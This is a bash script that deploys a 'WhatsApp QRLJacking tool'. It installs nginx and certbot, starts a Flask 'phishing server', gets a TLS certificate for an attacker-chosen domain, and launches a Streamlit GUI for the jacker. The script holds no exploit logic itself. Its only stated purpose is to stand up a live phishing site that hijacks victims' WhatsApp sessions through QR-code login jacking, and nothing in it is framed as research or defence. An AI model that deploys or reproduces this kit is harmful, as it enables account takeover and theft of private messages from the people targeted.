#!/bin/bash
set -e

# Configuration
DOMAIN="yourdomain.com"  # Replace with your domain
EMAIL="your.email@example.com"  # Replace with your email for Certbot
FLASK_PORT=1337
NGINX_CONF="/etc/nginx/sites-available/whatsapp_qrljacker"
VENV_PATH="venv"

echo "Setting up WhatsApp QRLJacking tool deployment..."

# Install dependencies
echo "Installing system dependencies..."
sudo apt update
sudo apt install -y python3 python3-venv nginx certbot python3-certbot-nginx

# Setup virtual environment
echo "Setting up Python virtual environment..."
python3 -m venv $VENV_PATH
source $VENV_PATH/bin/activate
pip install -r requirements.txt

# Start Flask server in background
echo "Starting Flask phishing server..."
nohup python3 src/phishing_server.py &

# Configure Nginx
echo "Configuring Nginx..."
sudo cp config/nginx.conf $NGINX_CONF
sudo sed -i "s/yourdomain.com/$DOMAIN/g" $NGINX_CONF
sudo ln -sf $NGINX_CONF /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx

# Obtain SSL certificate with Certbot
echo "Obtaining SSL certificate..."
sudo certbot --nginx -d $DOMAIN -d www.$DOMAIN --email $EMAIL --non-interactive --agree-tos

# Start Streamlit
echo "Starting Streamlit GUI..."
streamlit run src/qrl_whatsapp_jacker.py --server.port 8501 &

echo "Deployment complete! Phishing server at https://$DOMAIN, Streamlit GUI at http://localhost:8501"